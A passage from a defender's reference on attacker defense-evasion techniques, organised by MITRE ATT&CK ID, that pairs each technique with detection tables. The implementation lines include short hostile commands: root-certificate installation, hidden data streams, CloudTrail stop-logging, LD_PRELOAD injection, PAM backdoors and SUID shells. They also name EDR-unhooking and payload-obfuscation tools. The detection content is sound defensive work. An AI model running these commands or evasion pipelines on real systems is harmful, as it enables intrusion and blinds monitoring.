**Implementation:** `fodhelper.exe` registry hijack, `eventvwr.exe` registry hijack, `computerdefaults.exe`, CMSTPLUA COM interface, RunasCs `--bypass-uac` flag

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 12/13 — Registry modifications under HKCU\...\ms-settings\Shell\Open\command | `TargetObject\|contains: 'ms-settings\Shell\Open\command'` |
| Sysmon | Event ID 1 — Auto-elevated process spawning unexpected child | `ParentImage\|endswith\|any: ['\fodhelper.exe', '\eventvwr.exe']` with child != expected |
| Windows Security | Event ID 4688 — High-integrity process from medium-integrity parent without consent | Integrity level transition without UAC prompt |

**Detection Difficulty:** Medium

---

### 7.2 Sudo Caching (T1548.003)

**Technique:** Abuse sudo timestamp caching on Linux/macOS to execute commands as root without re-authentication.

**Implementation:** Wait for user to sudo, then use cached credentials within timeout window

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | SYSCALL for sudo from unexpected process | `exe: '/usr/bin/sudo'` with unusual `ppid` |
| sudo log | Unexpected sudo usage from background process | Parse /var/log/auth.log for sudo entries from non-interactive shells |

**Detection Difficulty:** Hard — legitimate sudo usage is frequent

---

## 8. Masquerading

### 8.1 Match Legitimate Name or Location (T1036.005)

**Technique:** Name malicious executables to match legitimate system binaries or place them in system directories.

**Implementation:** Name malware `svchost.exe`, `lsass.exe`, or `csrss.exe` but run from non-standard paths

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — Known system binary name from wrong path | `Image\|endswith: '\svchost.exe'` and NOT `Image\|startswith: 'C:\Windows\System32\'` |
| Sysmon | Event ID 1 — Known binary without expected parent | svchost.exe not spawned by services.exe |

**Detection Difficulty:** Easy with proper baselining

---

### 8.2 Right-to-Left Override (T1036.002)

**Technique:** Use Unicode RLO character (U+202E) to reverse the display of filename extensions.

**Implementation:** `invoice[RLO]fdp.exe` displays as `invoiceexe.pdf`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1/11 — filename containing U+202E | `TargetFilename\|contains: '\u202e'` |
| Email Gateway | Attachment filename with RLO character | Scan for Unicode override characters in filenames |

**Detection Difficulty:** Easy

---

### 8.3 Process Argument Spoofing (T1564.010 / T1036.011)

**Technique:** Create a process with benign arguments, then overwrite the PEB command line in memory with actual malicious arguments.

**Implementation:** SharpBlock (command line args spoofing), custom PEB patching

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| ETW | Kernel process creation callback captures original args | Compare ETW-reported args (pre-PEB modification) with Sysmon-reported args |
| EDR | PEB CommandLine != kernel-captured CommandLine | Requires kernel-mode telemetry comparison |
| Sysmon | Event ID 1 — suspiciously short/generic CommandLine for complex process | Behavioral: known complex binary with trivially simple args |

**Detection Difficulty:** Very Hard — requires kernel-level telemetry that captures args before PEB modification

---

### 8.4 Break Process Trees (T1036.009)

**Technique:** Use techniques to break parent-child process relationships, preventing tree-based analysis.

**Implementation:** WMI process creation, scheduled task execution, COM object instantiation, Parent PID spoofing

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — suspicious process with WmiPrvSE.exe or taskeng.exe parent | `ParentImage\|endswith: '\WmiPrvSE.exe'` with unusual child |
| Windows Security | Event ID 4688 — process creation via svchost (Task Scheduler) | Correlate with Event ID 4698 (scheduled task creation) |

**Detection Difficulty:** Medium

---

## 9. Subvert Trust Controls

### 9.1 Code Signing (T1553.002)

**Technique:** Sign malware with stolen, purchased, or self-generated code signing certificates.

**Implementation:** ScareCrow (generates signed payloads), CarbonCopy (clone code signing certs), stolen EV certificates

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 7 — Signed DLL with untrusted or new certificate | `Signature: 'Valid'` but `SignatureStatus: 'Untrusted'` |
| Certificate Transparency | Monitor CT logs for organization certificate issuance | Out-of-band: CT log monitoring for unexpected cert issuance |
| Static Analysis | Certificate chain validation and reputation | Low-reputation certificate signer on executable |

**Detection Difficulty:** Hard — valid signatures from compromised certs are trusted by default

---

### 9.2 Mark-of-the-Web Bypass (T1553.005)

**Technique:** Deliver payloads in container formats (ISO, VHD, 7z) that strip the MOTW Zone.Identifier ADS.

**Implementation:** Package payload in .iso or .vhd — when mounted, extracted files lose MOTW

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 11 — executable created from mounted ISO/VHD path | `TargetFilename\|contains: 'D:\'` (mounted drive) with executable extension |
| Sysmon | Event ID 1 — explorer.exe mounting virtual disk | `CommandLine\|endswith: '.iso'` or `.vhd` |
| Email Gateway | Block ISO/VHD/IMG attachments | Policy: quarantine container format attachments |

**Detection Difficulty:** Medium

---

### 9.3 Install Root Certificate (T1553.004)

**Technique:** Install attacker-controlled root CA certificate to trust malicious TLS certificates.

**Implementation:** `certutil -addstore Root attacker_ca.cer`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 12/13 — Registry write to certificate store | `TargetObject\|contains: 'ROOT\Certificates'` |
| Windows Security | Event ID 4657 — Registry value modification in cert store | `ObjectName\|contains: 'AuthRoot'` |
| Sysmon | Event ID 1 — certutil with -addstore Root | `CommandLine\|contains\|all: ['certutil', '-addstore', 'Root']` |

**Detection Difficulty:** Easy

---

## 10. Hijack Execution Flow

### 10.1 DLL Side-Loading (T1574.002)

**Technique:** Place a malicious DLL alongside a legitimate application that loads DLLs from its directory before system directories.

**Implementation:** Identify signed application vulnerable to side-loading, place crafted DLL with expected name

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 7 — DLL loaded from unexpected path | `Image` is legitimate signed binary but `ImageLoaded` is from user-writable path |
| Sysmon | Event ID 7 — Known side-loading targets | Maintain list of known vulnerable exe+dll pairs |

**Detection Difficulty:** Medium

---

### 10.2 DLL Search Order Hijacking (T1574.001/008)

**Technique:** Place malicious DLL in a directory searched before the legitimate DLL location.

**Implementation:** Plant DLL in CWD or PATH directory that precedes system32

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 7 — System DLL loaded from non-system path | `ImageLoaded\|endswith: '\known_system.dll'` and NOT `ImageLoaded\|startswith: 'C:\Windows\'` |

**Detection Difficulty:** Medium

---

### 10.3 COR_PROFILER Hijacking (T1574.012)

**Technique:** Set COR_PROFILER environment variable to load a malicious DLL into every .NET process.

**Implementation:** `setx COR_ENABLE_PROFILING 1`, `setx COR_PROFILER {CLSID}`, register malicious DLL as profiler

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 12/13 — Registry or environment variable for COR_PROFILER | `TargetObject\|contains: 'COR_PROFILER'` or `'COR_ENABLE_PROFILING'` |
| Sysmon | Event ID 7 — Unusual profiler DLL loaded by .NET processes | System-wide DLL load of non-Microsoft profiler |

**Detection Difficulty:** Easy

---

### 10.4 KernelCallbackTable Hijacking (T1574.013)

**Technique:** Modify the KernelCallbackTable in the PEB to redirect execution flow when kernel callbacks fire.

**Implementation:** Write malicious function pointers into PEB->KernelCallbackTable, triggered by window messages

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| EDR | PEB modification detection | KernelCallbackTable pointer changed to non-user32 address |
| ETW | WriteProcessMemory targeting PEB structure | Cross-process memory writes to PEB region |

**Detection Difficulty:** Very Hard

---

## 11. Hide Artifacts

### 11.1 NTFS Alternate Data Streams (T1564.004)

**Technique:** Store data in NTFS ADS, which are not visible to standard directory listing.

**Implementation:** `type malware.exe > legitimate.txt:hidden.exe`, `powershell Get-Content .\file.txt -Stream hidden`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 15 — FileCreateStreamHash (ADS creation) | `TargetFilename\|contains: ':'` (colon in non-drive position) |
| CMD | `dir /r` shows alternate streams | Periodic sweep: `Get-Item * -Stream * | Where Stream -ne ':$DATA'` |

**Detection Difficulty:** Easy (with Sysmon Event 15)

---

### 11.2 Hidden Files and Directories (T1564.001)

**Technique:** Set file/directory attributes to hidden.

**Implementation:** `attrib +h +s malware.exe`, `chflags hidden file` (macOS), dot-prefix on Linux

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — attrib.exe with +h flag | `CommandLine\|contains\|all: ['attrib', '+h']` |
| File monitoring | New hidden executable in user-writable paths | FIM: hidden files with executable extensions |

**Detection Difficulty:** Easy

---

### 11.3 VBA Stomping (T1564.007)

**Technique:** Remove VBA source code from Office documents while preserving compiled P-code, evading source-based analysis.

**Implementation:** Tools that strip VBA source while keeping compiled macro bytecode (P-code)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Static Analysis | VBA source hash != P-code behavior | pcodedmp: decompile P-code and compare with VBA source |
| Sandbox | Macro execution with missing VBA source | Document analysis: P-code present but VBA source empty/mismatched |

**Detection Difficulty:** Hard

---

### 11.4 File/Path Exclusions (T1564.012)

**Technique:** Write payloads to directories excluded from AV scanning.

**Implementation:** Query AV exclusion paths via `Get-MpPreference | Select ExclusionPath`, then stage payloads there

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| PowerShell | Event ID 4104 — Get-MpPreference querying exclusions | `ScriptBlockText\|contains: 'ExclusionPath'` |
| Sysmon | Event ID 11 — executable created in known exclusion path | Cross-reference file creation with AV exclusion list |

**Detection Difficulty:** Medium

---

## 12. Modify Authentication Process

### 12.1 Password Filter DLL (T1556.002)

**Technique:** Register a malicious password filter DLL that captures plaintext passwords during password changes.

**Implementation:** Register DLL under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 13 — Registry value modification of Notification Packages | `TargetObject\|endswith: 'Lsa\Notification Packages'` |
| Sysmon | Event ID 7 — lsass.exe loading non-Microsoft DLL | `Image\|endswith: '\lsass.exe'` and `ImageLoaded` not signed by Microsoft |

**Detection Difficulty:** Medium

---

### 12.2 Pluggable Authentication Modules (T1556.003)

**Technique:** Modify PAM configuration or add a malicious PAM module on Linux to backdoor authentication.

**Implementation:** Add `auth sufficient pam_evil.so` to /etc/pam.d/common-auth, or replace pam_unix.so

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | FILE_WRITE to /etc/pam.d/* or /lib/security/*.so | `path\|startswith: '/etc/pam.d/'` or `'/lib/security/'` |
| FIM | Modification of PAM configuration files | OSSEC/Wazuh: monitor /etc/pam.d/ and PAM module directories |
| Package manager | PAM module not matching package manager checksum | `rpm -V pam` or `debsums` to verify integrity |

**Detection Difficulty:** Medium

---

### 12.3 Domain Controller Authentication Patching (T1556.001)

**Technique:** Patch LSASS on a domain controller to accept any password (Skeleton Key attack).

**Implementation:** Mimikatz `misc::skeleton` — patches LSASS in-memory to add a master password

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 4673 — Sensitive privilege use by lsass modifications | Unusual process accessing lsass.exe memory |
| Sysmon | Event ID 10 — ProcessAccess to lsass.exe with write permissions | `TargetImage\|endswith: '\lsass.exe'` and `GrantedAccess` with write |
| Network | Kerberos RC4 downgrade (Skeleton Key forces RC4) | `EncryptionType: 0x17` (RC4) when AES is expected |

**Detection Difficulty:** Medium

---

## 13. Rootkits & Pre-OS Boot

### 13.1 Rootkit (T1014)

**Technique:** Intercept and modify OS API calls to hide processes, files, network connections, and registry keys from user-mode tools.

**Implementation:** Kernel-mode rootkits (driver-based), DKOM (Direct Kernel Object Manipulation), SSDT hooking

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Cross-view comparison | Compare user-mode API results with kernel-mode data | Process list from ZwQuerySystemInformation vs user-mode API |
| UEFI Secure Boot | Unsigned driver load attempt blocked | Enforce Secure Boot + driver signing requirements |
| Memory forensics | SSDT/IDT modification detection | Volatility: `ssdt`, `idt` plugins for hook detection |

**Detection Difficulty:** Very Hard

---

### 13.2 Bootkit (T1542.003)

**Technique:** Modify MBR/VBR/boot manager to execute malicious code before the OS loads.

**Implementation:** FinFisher bootkit, MosaicRegressor (UEFI), BlackLotus (CVE-2022-21894)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| UEFI Secure Boot | Boot integrity violation | Enforce Secure Boot with custom secure boot keys |
| Measured Boot | PCR value mismatch in TPM log | TPM attestation: unexpected PCR measurements |
| Disk forensics | MBR/VBR hash comparison | Baseline MBR hash and monitor for changes |

**Detection Difficulty:** Very Hard

---

### 13.3 System Firmware (T1542.001)

**Technique:** Modify BIOS/UEFI firmware for persistence below the operating system.

**Implementation:** Hacking Team UEFI rootkit, LoJax, CosmicStrand

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| UEFI | Firmware integrity measurement | CHIPSEC framework: verify firmware against known-good baseline |
| Secure Boot | Unauthorized firmware module detection | DBX (revocation list) maintenance |

**Detection Difficulty:** Very Hard

---

## 14. Reflective Code Loading

### 14.1 Reflective Code Loading (T1620)

**Technique:** Load code directly into process memory without file-backed modules, bypassing DLL load monitoring.

**Implementation:** Reflective DLL Injection (Stephen Fewer), .NET Assembly.Load(byte[]), Cobalt Strike beacon, Empire in-memory .NET assembly execution

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| ETW | .NET CLR Assembly Load with empty `AssemblyPath` | `Microsoft-Windows-DotNETRuntime` provider: AssemblyLoadFromGac=false and no file path |
| Sysmon | Event ID 7 — module load with no file backing | `ImageLoaded` is null or memory-only |
| EDR | Executable memory pages not backed by filesystem object | Scan for PE headers (MZ magic) in private memory regions |

**Detection Difficulty:** Hard

---

## 15. Indirect Command Execution

### 15.1 Indirect Command Execution (T1202)

**Technique:** Use trusted utilities (forfiles, pcalua, SyncAppvPublishingServer) to execute commands while evading command-line monitoring focused on cmd/powershell.

**Implementation:**
- `forfiles /p C:\Windows /m notepad.exe /c "cmd /c malicious_command"`
- `pcalua.exe -a malware.exe`
- `SyncAppvPublishingServer.exe "n; Start-Process malware.exe"` (T1216.002)
- `PubPrn.vbs` for remote script execution (T1216.001)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — uncommon LOLBins executing commands | `Image\|endswith\|any: ['\forfiles.exe', '\pcalua.exe', '\SyncAppvPublishingServer.exe']` |
| Sysmon | Event ID 1 — child process spawned from LOLBin | Unusual parent-child: forfiles.exe -> cmd.exe |

**Detection Difficulty:** Easy to Medium (once rules are in place)

---

## 16. Domain & Tenant Policy Modification

### 16.1 Group Policy Modification (T1484.001)

**Technique:** Modify Group Policy Objects to push malicious settings, scripts, or configurations domain-wide.

**Implementation:** Modify SYSVOL GPO files, SharpGPOAbuse, GPO scheduled task deployment

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 5136 — Directory Service Object Modified (GPO) | `ObjectClass: 'groupPolicyContainer'` |
| Sysmon | Event ID 11/23 — file creation/modification in SYSVOL\Policies | `TargetFilename\|contains: '\SYSVOL\' and '\Policies\'` |

**Detection Difficulty:** Medium

---

### 16.2 Trust Modification (T1484.002)

**Technique:** Add new domain trusts or modify existing trust relationships to enable cross-domain access.

**Implementation:** `netdom trust`, PowerShell AD module, Mimikatz Golden Ticket for cross-forest

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 4706 — A new trust was created | Always alert: new trust creation is rare and significant |
| Windows Security | Event ID 4707 — A trust was removed | Monitor trust lifecycle events |
| AD Replication | Trust object creation in System container | Monitor CN=System for new trustedDomain objects |

**Detection Difficulty:** Easy (events are clear, but rarely monitored)

---

## 17. NTLM Coercion & Auth Evasion

### 17.1 PetitPotam — NTLM Coercion (T1187 / T1557)

**Technique:** Force Windows hosts to authenticate to attacker-controlled systems via MS-EFSRPC (EfsRpcOpenFileRaw). Enables NTLM relay attacks without credentials against domain controllers.

**Implementation:** PetitPotam (CVE-2021-36942) — Python (Impacket) and Windows executable versions. Uses LSARPC named pipe with interface c681d488-d850-11d0-8c52-00c04fd90f7e.

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Network | DCERPC EfsRpcOpenFileRaw on LSARPC pipe | Zeek/Suricata: `alert dcerpc any -> any any (msg:"PetitPotam EFSRPC"; interface_uuid: c681d488-d850-11d0-8c52-00c04fd90f7e; opnum: 0;)` |
| Windows Security | Event ID 4624 — Logon from DC to unexpected target | Machine account authentication to non-standard services |
| Network | NTLM authentication to external/unexpected hosts | Monitor for NTLM auth from DCs to non-DC targets |

**Detection Difficulty:** Medium — network-based detection is reliable

---

### 17.2 LocalPotato — NTLM Local Reflection (T1068)

**Technique:** Exploit CVE-2023-21746 to reflect NTLM authentication locally, achieving arbitrary file read/write with SYSTEM privileges. HTTP/WebDAV variant remains unpatched.

**Implementation:** LocalPotato (C++) — SMB variant (patched Jan 2023), HTTP/WebDAV variant (unpatched per disclosure).

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 4624 — local NTLM logon from loopback | `IpAddress: '127.0.0.1'` with NTLM authentication |
| Network | Loopback NTLM authentication on SMB/HTTP | Monitor 127.0.0.1 NTLM challenge-response traffic |
| Sysmon | Event ID 11 — file creation by SYSTEM in unusual locations | SYSTEM-context file writes after local NTLM reflection |

**Detection Difficulty:** Hard — loopback NTLM is unusual but legitimate in some scenarios

---

### 17.3 RunasCs — Credential Execution Evasion (T1134)

**Technique:** Execute processes under different credentials with more control than native runas.exe. Supports UAC bypass, remote impersonation, and NetworkCleartext logon type (bypasses UAC filtering).

**Implementation:** RunasCs (C#) — uses CreateProcessAsUserW/CreateProcessWithTokenW/CreateProcessWithLogonW depending on available privileges. Flags: `--bypass-uac`, `--remote-impersonation`, logon type 8 (NetworkCleartext).

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 4624 — Logon Type 8 (NetworkCleartext) from local process | `LogonType: 8` from non-service process |
| Windows Security | Event ID 4648 — Explicit credential logon | `TargetUserName` different from `SubjectUserName` with explicit creds |
| Sysmon | Event ID 1 — RunasCs.exe execution | `Image\|endswith: '\RunasCs.exe'` or `OriginalFileName: 'RunasCs.exe'` |

**Detection Difficulty:** Medium

---

## 18. AV/EDR Bypass Tooling

### 18.1 SharpBlock — EDR DLL Blocking (T1562.001)

**Technique:** Prevent EDR user-mode DLLs from initializing in a spawned process by blocking their entry point execution. Includes patchless AMSI bypass, patchless ETW bypass, process hollowing detection bypass, and command-line argument spoofing.

**Implementation:** SharpBlock (C#) — blocks DLL entry point for EDR DLLs, supports payload delivery via disk/HTTP/named pipes (Cobalt Strike compatible). Hides implanted process from hollow detection scanners.

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| EDR (kernel mode) | EDR DLL loaded but DllMain never executed | Kernel callback: DLL load notification without expected initialization |
| Sysmon | Event ID 1 — process with suspiciously spoofed command line | CommandLine anomaly detection (see Process Argument Spoofing) |
| Memory scanning | Process without expected EDR hooks in ntdll/kernel32 | Compare hook state of process against baseline |

**Detection Difficulty:** Very Hard — specifically designed to evade user-mode EDR telemetry

---

### 18.2 SharpUnhooker — DLL Unhooking (T1562.001 / T1562.006)

**Technique:** Remove inline hooks, EAT hooks, and IAT hooks placed by EDR/AV on ntdll.dll, kernel32.dll, advapi32.dll, and kernelbase.dll. Also includes AMSI and ETW patchers.

**Implementation:** SharpUnhooker (C#) — three unhooking methods:
1. **JMPUnhooker** — removes JMP/hot-patch/inline hooks
2. **EATUnhooker** — restores Export Address Table entries
3. **IATUnhooker** — restores Import Address Table entries
Refreshes API DLLs to their on-disk clean state.

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| EDR (kernel callbacks) | Hook integrity check failure | Periodic hook verification: ntdll .text section hash mismatch |
| ETW-TI | NtReadVirtualMemory reading clean ntdll from disk for comparison | Behavioral: process reads ntdll.dll from \KnownDlls\ or disk |
| Memory scanning | Clean ntdll in non-expected memory region | Secondary copy of ntdll mapped into process address space |

**Detection Difficulty:** Hard — unhooking restores clean state, making the process look "normal"

---

### 18.3 Payload Obfuscation Pipeline (T1027)

**Technique:** Multi-stage obfuscation pipeline combining encryption, encoding, packing, and signing to evade static and dynamic analysis.

**Implementation (from BypassAV mindmap):**
- **Shellcode generation:** msfvenom with RC4/shikata_ga_nai, Cobalt Strike/Havoc shellcode
- **Loaders:** Manual loaders in Go/C/C++/.NET/Rust/Nim, automatic loaders (ScareCrow, PEzor, Inceptor)
- **Static obfuscation:** Packing, polymorphic code, signature hiding, metadata manipulation, code signing
- **Dynamic obfuscation:** Direct/indirect syscalls (SysWhispers), delayed execution (Ekko, Deathsleep), ETW disable, DInvoke
- **Process injection:** CreateRemoteThread, APC injection, process hollowing, thread hijacking, reflective DLL, DLL sideloading/proxying, COM hijacking

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sandbox | Behavioral detonation: ignore static, analyze runtime behavior | Dynamic analysis: API call sequences, network callbacks |
| EDR | ML-based binary classification | Entropy analysis + structural anomaly detection |
| Network | C2 callback after execution | DNS/HTTP/HTTPS beaconing detection (JA3/JARM fingerprinting) |

**Detection Difficulty:** Hard to Very Hard — multi-layered evasion requires defense in depth

---

### 18.4 Sleep Obfuscation (T1497 / T1622)

**Technique:** Encrypt or hide beacon memory during sleep intervals to evade periodic memory scanning.

**Implementation:**
- **Ekko** — Timer-based sleep with ROP chain to encrypt/decrypt beacon memory
- **Deathsleep** — Suspends threads and encrypts memory during sleep
- **Cobalt Strike sleep_mask** — Masks beacon in memory between callbacks

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| ETW | Timer queue creation with ROP-suspicious addresses | NtCreateTimer with callback to VirtualProtect/SystemFunction032 |
| EDR | Thread suspension patterns during sleep cycles | Periodic thread suspend/resume with memory protection changes |
| Memory scanning | Encrypted memory regions that periodically become executable | Page protection flipping: RW <-> RX transitions |

**Detection Difficulty:** Very Hard

---

## 19. Network & Traffic Evasion

### 19.1 C2 Channel Obfuscation (T1071 / T1573)

**Technique:** Disguise C2 traffic as legitimate protocols or encrypt communications to evade network inspection.

**Implementation:**
- Empire C2: encrypted communications, JA3/S and JARM evasion
- DNS tunneling (dnscat2, iodine)
- Domain fronting (CDN abuse)
- HTTPS with custom profiles (Cobalt Strike Malleable C2)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Network | JA3/JARM fingerprint matching known C2 frameworks | JA3 hash database: match against Cobalt Strike/Empire/Metasploit fingerprints |
| DNS | High-entropy DNS queries, high query volume to single domain | DNS query entropy > threshold, TXT record abuse |
| Proxy | Domain fronting: Host header != SNI | Compare TLS SNI with HTTP Host header |
| Network | Beacon interval analysis: regular callback timing | Statistical analysis: periodic HTTP/S connections with jitter |

**Detection Difficulty:** Medium (known fingerprints) to Very Hard (custom profiles with evasion)

---

### 19.2 Port Knocking & Traffic Signaling (T1205.001)

**Technique:** Use specific sequences of network packets (port knocks) to open hidden services or activate backdoors.

**Implementation:** knockd, custom iptables rules, magic packet sequences

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Network | Sequential connection attempts to closed ports from same source | Firewall logs: multiple rejected connections in sequence from same IP |
| Firewall | iptables rule changes after specific traffic pattern | Monitor for dynamic firewall rule insertion |

**Detection Difficulty:** Hard

---

## 20. Anti-Analysis Techniques

### 20.1 Anti-Debugging (T1622 / Unprotect.it)

**Technique:** Detect if a debugger is attached and alter behavior (terminate, produce benign output, enter infinite loop).

**Implementation:**
- `IsDebuggerPresent()`, `NtQueryInformationProcess(ProcessDebugPort)`
- Timing checks: `rdtsc`, `QueryPerformanceCounter` discrepancies
- Hardware breakpoint detection via `GetThreadContext`
- INT 2D / INT 3 exception-based detection
- PEB.BeingDebugged flag check

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Static Analysis | YARA rules for anti-debug API imports | `IsDebuggerPresent`, `NtQueryInformationProcess`, `CheckRemoteDebuggerPresent` |
| Sandbox | Behavioral difference between debug and non-debug execution | Multi-execution comparison: debugger-present vs absent |

**Detection Difficulty:** Easy (identification) — these are indicators of malicious intent, not evasion of detection infrastructure

---

### 20.2 Anti-VM/Anti-Sandbox (T1497 / Unprotect.it)

**Technique:** Detect virtual machine or sandbox environment and refuse to execute malicious payload.

**Implementation (from Unprotect.it and BypassAV):**
- **Software checks:** Process count analysis, user interaction testing, running process names (vmtoolsd, vboxservice)
- **Hardware checks:** CPUID timing, MAC address OUI (VMware 00:0C:29), processor core/RAM thresholds, disk size
- **Timing checks:** Accelerated clock detection, sleep skipping detection
- **User interaction:** Mouse movement, click patterns, document scrolling
- **Environment:** Computer name patterns, recently opened files, installed software count

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Static Analysis | YARA for VM detection strings/APIs | `'VMwareVMware'`, `'VBOX'`, `GetTickCount`, `CPUID` leaf patterns |
| Sandbox | Failed detonation due to environment check | Harden sandbox: realistic user profiles, hardware specs, interaction simulation |

**Detection Difficulty:** Easy (identification) — anti-VM code is itself an IOC

---

## 21. Cloud Defense Evasion

### 21.1 Modify Cloud Compute Infrastructure (T1578)

**Technique:** Create snapshots, new instances, or modify cloud configs to bypass network security controls or destroy forensic evidence.

**Sub-techniques:**
- T1578.001: Create Snapshot — access data from snapshot bypassing instance-level controls
- T1578.002: Create Cloud Instance — spin up instance in permissive security group
- T1578.003: Delete Cloud Instance — destroy evidence
- T1578.004: Revert Cloud Instance — revert to pre-compromise snapshot

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| CloudTrail/Activity Log | CreateSnapshot, RunInstances, TerminateInstances from unusual principal | `eventName\|any: ['CreateSnapshot', 'RunInstances', 'TerminateInstances']` from non-automation IAM |
| Cloud SIEM | Instance creation in non-standard region or VPC | Geographic or VPC anomaly detection |

**Detection Difficulty:** Medium — cloud audit logs are comprehensive if enabled

---

### 21.2 Disable or Modify Cloud Logs (T1562.008)

**Technique:** Disable CloudTrail, GCP Audit Logs, or Azure Diagnostic Settings to eliminate audit trail.

**Implementation:** `aws cloudtrail stop-logging`, `aws cloudtrail delete-trail`, modify Azure diagnostic settings

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| CloudTrail | `StopLogging` or `DeleteTrail` API calls | Always alert on StopLogging/DeleteTrail events (these are the last events before blindness) |
| AWS Config | Configuration change on CloudTrail resource | AWS Config rule: cloudtrail-enabled |
| GuardDuty/Defender | Built-in alert for logging tampering | Native cloud security service alerts |

**Detection Difficulty:** Easy — these actions generate alerts before logging stops

---

## 22. Linux-Specific Evasion

### 22.1 Kernel Exploit Privilege Escalation (T1068)

**Technique:** Exploit kernel vulnerabilities to escalate from user to root, bypassing all user-space security controls.

**Implementation:** linux-exploit-suggester identifies applicable kernel CVEs based on:
- Kernel version matching against exploit database
- Compile-time kernel config checks (stack protection, KASLR)
- Runtime sysctl security settings
- SMEP/SMAP/KASLR bypass inclusion in exploit code

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | SYSCALL for execve of exploit binary | Unknown binary execution followed by uid=0 transition |
| Kernel logs (dmesg) | Kernel oops/panic during exploitation attempts | `dmesg\|contains\|any: ['general protection fault', 'BUG:', 'unable to handle']` |
| FIM | New SUID binary or unexpected binary in /tmp | Monitor /tmp and /dev/shm for new executables |
| Host agent | Process running as root with no corresponding sudo/su entry | Root process without audit trail of privilege transition |

**Detection Difficulty:** Hard — successful kernel exploits operate below userspace monitoring

---

### 22.2 LD_PRELOAD / Dynamic Linker Hijacking (T1574.006)

**Technique:** Set LD_PRELOAD or modify /etc/ld.so.preload to inject shared libraries into every process.

**Implementation:** `export LD_PRELOAD=/tmp/evil.so`, write to /etc/ld.so.preload

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | File write to /etc/ld.so.preload | `path: '/etc/ld.so.preload'` and `syscall: 'open'` with write flags |
| Environment monitoring | LD_PRELOAD set in process environment | `cat /proc/*/environ \| grep LD_PRELOAD` periodic check |
| FIM | /etc/ld.so.preload modification | Wazuh/OSSEC: monitor /etc/ld.so.preload |

**Detection Difficulty:** Medium

---

### 22.3 Cgroup/Namespace Escape (T1611)

**Technique:** Escape container isolation via cgroup manipulation, namespace abuse, or kernel vulnerabilities.

**Implementation:** Privileged container escape, `nsenter`, cgroup release_agent abuse, CVE-2022-0847 (Dirty Pipe)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | Mount namespace changes, cgroup writes from container | `syscall: 'mount'` from containerized process |
| Falco | Container escape detection rules | `rule: Container Escape via mount` |
| Kernel | /proc/self/ns/* changes from container context | Monitor namespace transitions |

**Detection Difficulty:** Hard

---

### 22.4 Setuid/Setgid Abuse (T1548.001)

**Technique:** Create or abuse SUID/SGID binaries to execute with elevated privileges.

**Implementation:** `chmod u+s /tmp/shell`, abuse existing SUID binaries (GTFOBins)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | SYSCALL for chmod/fchmod with SUID bit | `syscall: 'chmod'` and `a1\|contains: '4'` (setuid bit) |
| FIM | New SUID binary detection | Periodic: `find / -perm -4000 -newer /etc/suid_baseline` |
